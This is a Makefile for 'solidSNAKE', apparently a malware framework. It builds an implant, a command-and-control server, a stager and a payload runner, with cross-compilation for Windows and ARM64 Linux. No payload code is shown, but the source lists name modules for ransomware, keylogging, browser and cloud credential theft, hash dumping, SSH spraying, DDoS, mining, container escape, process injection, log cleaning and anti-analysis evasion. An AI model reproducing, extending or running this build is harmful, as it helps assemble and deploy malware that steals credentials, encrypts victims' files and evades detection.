# solidSNAKE - build system.
#
# Targets:
#   make                 build all fleet binaries + C2 server
#   make test            run tests/run_tests.sh
#   make clean           remove the build directory
#   make winstealth-check   run scripts/winstealth_check.sh (mingw cross-check)
#   make cross-linux-arm64          cross-compile the fleet for aarch64
#   make cross-windows-amd64        cross-compile the fleet for x86_64-w64-mingw32
#   make cross-windows-amd64-implant / -stager / -runner   individual legs
#
# Overridable variables (crossbuild.sh passes all of these):
#   CXX, CC, BUILD, EXE, CXXFLAGS, CFLAGS, LDLIBS, NETLIBS, CROSS_ROOT

CXX      ?= g++
CC       ?= gcc
BUILD    ?= build

# ---- Platform detection -----------------------------------------------------

ifeq ($(OS),Windows_NT)
  EXE ?= .exe
else
  EXE ?=
endif

# A mingw CXX means we are cross-compiling to Windows even if the host is linux.
ifneq (,$(findstring mingw,$(CXX)))
  EXE        := .exe
  WIN_COMPAT := -Icompat/win32 -D_WIN32_WINNT=0x0601
else
  WIN_COMPAT :=
endif

# ---- Flags ------------------------------------------------------------------

CXXFLAGS ?= -std=c++17 -O2 -Wall -Wextra -Wpedantic
CXXFLAGS += -Iinclude -Ithird_party -Ithird_party/sqlite $(WIN_COMPAT)

CFLAGS ?= -O2 -Wall
CFLAGS += -Ithird_party/sqlite

LDLIBS  ?= -lsodium
NETLIBS ?= -lssl -lcrypto -ldl -lpthread

# ---- Source lists -----------------------------------------------------------

# Shared core: used by the implant and the payload runner.
CORE_SRCS := \
    src/antianalysis.cpp \
    src/crypto.cpp \
    src/dns.cpp \
    src/gob.cpp \
    src/lifetime.cpp \
    src/malleable.cpp \
    src/net.cpp \
    src/payloads.cpp \
    src/protocol.cpp \
    src/schedule.cpp \
    src/sleepmask.cpp \
    src/sys.cpp

# Payload modules. All are #ifdef-guarded internally, so it is safe to compile
# every file on every platform; the empty translation units collapse to nothing.
PAYLOAD_SRCS := \
    src/payloads/polyloader.cpp \
    src/payloads/cloud_detector.cpp \
    src/payloads/ddos.cpp \
    src/payloads/sysrecon.cpp \
    src/payloads/dnstunnel.cpp \
    src/payloads/persistence.cpp \
    src/payloads/copyfail.cpp \
    src/payloads/fileransom.cpp \
    src/payloads/mine.cpp \
    src/payloads/keylogger.cpp \
    src/payloads/k8s_secret_stealer.cpp \
    src/payloads/filehider.cpp \
    src/payloads/browserstealer.cpp \
    src/payloads/sshspray.cpp \
    src/payloads/linpeas.cpp \
    src/payloads/screenshot.cpp \
    src/payloads/logcleaner.cpp \
    src/payloads/container_escape.cpp \
    src/payloads/azure_cred_harvester.cpp \
    src/payloads/autodeploy.cpp \
    src/payloads/aws_cred_stealer.cpp \
    src/payloads/process_inject.cpp \
    src/payloads/competitor_cleaner.cpp \
    src/payloads/hashdump.cpp \
    src/payloads/platform_unix.cpp \
    src/payloads/platform_windows.cpp

# Implant. Both platform impls are compiled and each is guarded; only one is
# non-empty at link time. Same for the Windows stealth units.
IMPLANT_SRCS := \
    src/main.cpp \
    src/implant.cpp \
    src/implant_platform_unix.cpp \
    src/implant_platform_windows.cpp \
    src/evade.cpp \
    src/evade_windows.cpp \
    src/winstealth.cpp \
    src/winstealth_windows.cpp \
    $(CORE_SRCS) \
    $(PAYLOAD_SRCS)

# C2 server (linux-native component; not part of the cross-built fleet).
C2_SRCS := \
    src/c2_main.cpp \
    src/c2.cpp \
    src/api.cpp \
    src/cert.cpp \
    src/crypto.cpp \
    src/dashboard_html.cpp \
    src/gob.cpp \
    src/httpd.cpp \
    src/mesh.cpp \
    src/net.cpp \
    src/protocol.cpp \
    src/store.cpp \
    src/sys.cpp

# Stager.
STAGER_SRCS := \
    src/stager_main.cpp \
    src/stager.cpp \
    src/crypto.cpp \
    src/net.cpp \
    src/sys.cpp

# Payload runner CLI.
RUNNER_SRCS := \
    src/runner_main.cpp \
    src/runner.cpp \
    src/crypto.cpp \
    src/dns.cpp \
    src/net.cpp \
    src/payloads.cpp \
    src/sys.cpp \
    $(PAYLOAD_SRCS)

# SQLite amalgamation (compiled with the C compiler).
SQLITE_SRC := third_party/sqlite/sqlite3.c

# ---- Object mapping ---------------------------------------------------------

OBJDIR := $(BUILD)/obj

obj   = $(patsubst %.cpp,$(OBJDIR)/%.o,$(1))
obj_c = $(patsubst %.c,$(OBJDIR)/%.o,$(1))

SQLITE_OBJ := $(call obj_c,$(SQLITE_SRC))

IMPLANT_OBJS := $(call obj,$(IMPLANT_SRCS)) $(SQLITE_OBJ)
C2_OBJS      := $(call obj,$(C2_SRCS))      $(SQLITE_OBJ)
STAGER_OBJS  := $(call obj,$(STAGER_SRCS))
RUNNER_OBJS  := $(call obj,$(RUNNER_SRCS))  $(SQLITE_OBJ)

# ---- Binary names -----------------------------------------------------------

IMPLANT_BIN := $(BUILD)/solidsnake$(EXE)
C2_BIN      := $(BUILD)/solidsnake-c2$(EXE)
STAGER_BIN  := $(BUILD)/solidsnake-stager$(EXE)
RUNNER_BIN  := $(BUILD)/solidsnake-payloads$(EXE)

.PHONY: all clean distclean test winstealth-check \
        cross-linux-arm64 cross-windows-amd64 \
        cross-windows-amd64-implant cross-windows-amd64-stager \
        cross-windows-amd64-runner

all: $(IMPLANT_BIN) $(C2_BIN) $(STAGER_BIN) $(RUNNER_BIN)

# ---- Compile rules ----------------------------------------------------------

$(OBJDIR)/%.o: %.cpp
	@mkdir -p $(dir $@)
	$(CXX) $(CXXFLAGS) -c $< -o $@

$(OBJDIR)/%.o: %.c
	@mkdir -p $(dir $@)
	$(CC) $(CFLAGS) -c $< -o $@

# ---- Link rules -------------------------------------------------------------

$(IMPLANT_BIN): $(IMPLANT_OBJS)
	@mkdir -p $(dir $@)
	$(CXX) $(CXXFLAGS) $^ -o $@ $(LDLIBS) $(NETLIBS)

$(C2_BIN): $(C2_OBJS)
	@mkdir -p $(dir $@)
	$(CXX) $(CXXFLAGS) $^ -o $@ $(LDLIBS) $(NETLIBS)

$(STAGER_BIN): $(STAGER_OBJS)
	@mkdir -p $(dir $@)
	$(CXX) $(CXXFLAGS) $^ -o $@ $(LDLIBS) $(NETLIBS)

$(RUNNER_BIN): $(RUNNER_OBJS)
	@mkdir -p $(dir $@)
	$(CXX) $(CXXFLAGS) $^ -o $@ $(LDLIBS) $(NETLIBS)

# ---- Unit tests -------------------------------------------------------------
# The test suite is driven by tests/run_tests.sh, which is expected to build
# individual test binaries (tests/test_*.cpp) with the same flags used here.
# A few common targets are wired below so `make build/test_*` works standalone;
# add more as needed.

$(BUILD)/test_store: tests/test_store.cpp $(SQLITE_OBJ)
	@mkdir -p $(dir $@)
	$(CXX) $(CXXFLAGS) tests/test_store.cpp \
	    src/store.cpp src/crypto.cpp src/protocol.cpp \
	    $(SQLITE_OBJ) -o $@ $(LDLIBS) $(NETLIBS)

$(BUILD)/test_mesh: tests/test_mesh.cpp
	@mkdir -p $(dir $@)
	$(CXX) $(CXXFLAGS) tests/test_mesh.cpp \
	    src/mesh.cpp src/gob.cpp src/crypto.cpp src/cert.cpp \
	    -o $@ $(LDLIBS) $(NETLIBS)

$(BUILD)/test_crypto: tests/test_crypto.cpp
	@mkdir -p $(dir $@)
	$(CXX) $(CXXFLAGS) tests/test_crypto.cpp src/crypto.cpp -o $@ $(LDLIBS)

$(BUILD)/test_antianalysis: tests/test_antianalysis.cpp
	@mkdir -p $(dir $@)
	$(CXX) $(CXXFLAGS) tests/test_antianalysis.cpp src/antianalysis.cpp -o $@

$(BUILD)/test_winstealth: tests/test_winstealth.cpp
	@mkdir -p $(dir $@)
	$(CXX) $(CXXFLAGS) tests/test_winstealth.cpp src/winstealth.cpp -o $@

$(BUILD)/test_evade: tests/test_evade.cpp
	@mkdir -p $(dir $@)
	$(CXX) $(CXXFLAGS) tests/test_evade.cpp src/evade.cpp src/winstealth.cpp -o $@

$(BUILD)/test_sleepmask: tests/test_sleepmask.cpp
	@mkdir -p $(dir $@)
	$(CXX) $(CXXFLAGS) tests/test_sleepmask.cpp src/sleepmask.cpp src/crypto.cpp -o $@ $(LDLIBS)

$(BUILD)/test_malleable: tests/test_malleable.cpp
	@mkdir -p $(dir $@)
	$(CXX) $(CXXFLAGS) tests/test_malleable.cpp src/malleable.cpp -o $@

$(BUILD)/test_schedule: tests/test_schedule.cpp
	@mkdir -p $(dir $@)
	$(CXX) $(CXXFLAGS) tests/test_schedule.cpp src/schedule.cpp -o $@

$(BUILD)/test_lifetime: tests/test_lifetime.cpp
	@mkdir -p $(dir $@)
	$(CXX) $(CXXFLAGS) tests/test_lifetime.cpp src/lifetime.cpp src/crypto.cpp -o $@ $(LDLIBS)

$(BUILD)/test_dns: tests/test_dns.cpp
	@mkdir -p $(dir $@)
	$(CXX) $(CXXFLAGS) tests/test_dns.cpp src/dns.cpp src/crypto.cpp -o $@ $(LDLIBS)

$(BUILD)/test_protocol: tests/test_protocol.cpp
	@mkdir -p $(dir $@)
	$(CXX) $(CXXFLAGS) tests/test_protocol.cpp src/protocol.cpp -o $@

test: all
	@bash tests/run_tests.sh

winstealth-check:
	@bash scripts/winstealth_check.sh

# ---- Cross-compilation ------------------------------------------------------
# Static libsodium + OpenSSL prefixes are produced by scripts/crossbuild.sh and
# live under $(CROSS_ROOT)/<tag>. See the script for the exact per-target
# dependency layout.

CROSS_ROOT      ?= /tmp/snake-cross
CROSS_CXXFLAGS  := -std=c++17 -O2 -Wall -Wextra -Wpedantic \
                   -Iinclude -Ithird_party -Ithird_party/sqlite

# linux/arm64 -----------------------------------------------------------------
ARM64_CFLAGS := $(CROSS_CXXFLAGS) -I$(CROSS_ROOT)/arm64/include
ARM64_LIBS   := -L$(CROSS_ROOT)/arm64/lib -L$(CROSS_ROOT)/arm64/lib64 -lsodium
ARM64_NETLIBS := -L$(CROSS_ROOT)/arm64/lib -L$(CROSS_ROOT)/arm64/lib64 \
                 -lssl -lcrypto -ldl -lpthread

cross-linux-arm64:
	$(MAKE) BUILD=build/cross/linux-arm64 EXE= \
	    CC=aarch64-linux-gnu-gcc CXX=aarch64-linux-gnu-g++ \
	    CXXFLAGS="$(ARM64_CFLAGS)" LDLIBS="$(ARM64_LIBS)" NETLIBS="$(ARM64_NETLIBS)" \
	    build/cross/linux-arm64/solidsnake \
	    build/cross/linux-arm64/solidsnake-stager \
	    build/cross/linux-arm64/solidsnake-payloads

# windows/amd64 (mingw) -------------------------------------------------------
# OpenSSL and libsodium install into lib64 on mingw64; the -L flag carries both.
WIN_CFLAGS  := $(CROSS_CXXFLAGS) -Icompat/win32 -D_WIN32_WINNT=0x0601 \
               -I$(CROSS_ROOT)/win64/include
WIN_LIBS    := -L$(CROSS_ROOT)/win64/lib -L$(CROSS_ROOT)/win64/lib64 -lsodium
WIN_NETLIBS := -L$(CROSS_ROOT)/win64/lib -L$(CROSS_ROOT)/win64/lib64 \
               -lssl -lcrypto -lws2_32 -liphlpapi -lcrypt32 -lbcrypt \
               -ladvapi32 -luser32 -lntdll -ldl

WIN_MAKE_ARGS := BUILD=build/cross/windows-amd64 EXE=.exe \
    CC=x86_64-w64-mingw32-gcc CXX=x86_64-w64-mingw32-g++ \
    CXXFLAGS="$(WIN_CFLAGS)" LDLIBS="$(WIN_LIBS)" NETLIBS="$(WIN_NETLIBS)"

cross-windows-amd64:
	$(MAKE) $(WIN_MAKE_ARGS) \
	    build/cross/windows-amd64/solidsnake.exe \
	    build/cross/windows-amd64/solidsnake-stager.exe \
	    build/cross/windows-amd64/solidsnake-payloads.exe

cross-windows-amd64-implant:
	$(MAKE) $(WIN_MAKE_ARGS) build/cross/windows-amd64/solidsnake.exe

cross-windows-amd64-stager:
	$(MAKE) $(WIN_MAKE_ARGS) build/cross/windows-amd64/solidsnake-stager.exe

cross-windows-amd64-runner:
	$(MAKE) $(WIN_MAKE_ARGS) build/cross/windows-amd64/solidsnake-payloads.exe

# ---- Cleanup ----------------------------------------------------------------

clean:
	rm -rf $(BUILD)

distclean: clean
	rm -rf build/cross
